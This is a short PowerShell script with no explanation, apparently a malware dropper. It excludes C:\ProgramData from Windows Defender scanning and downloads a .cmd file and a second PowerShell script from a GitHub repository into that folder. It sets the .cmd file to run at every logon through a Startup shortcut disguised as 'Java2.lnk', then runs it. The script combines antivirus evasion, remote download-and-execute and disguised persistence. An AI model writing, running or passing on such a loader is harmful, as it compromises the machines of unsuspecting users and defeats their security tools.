Set-MpPreference -ExclusionPath C:\ProgramData
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$down = New-Object System.Net.WebClient
$url = 'https://github.com/raju-fakhrul/project/raw/main/AW_pro.cmd?raw=true'
$file = "C:\ProgramData\AW_pro.cmd"
$down.DownloadFile($url,$file)
$objShell = New-Object -ComObject ("WScript.Shell")
$objShortCut = $objShell.CreateShortcut("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" + "\Java2.lnk")
$objShortCut.TargetPath="C:\ProgramData\AW_pro.cmd"
$objShortCut.Save()
$down = New-Object System.Net.WebClient
$url2 = 'https://github.com/raju-fakhrul/project/raw/main/scrip.ps1?raw=true'
$file2 = "C:\ProgramData\scrip.ps1"
$down.DownloadFile($url2,$file2)
$file = "C:\ProgramData\AW_pro.cmd"
$exec = New-Object -com shell.application
$exec.shellexecute($file)
exit

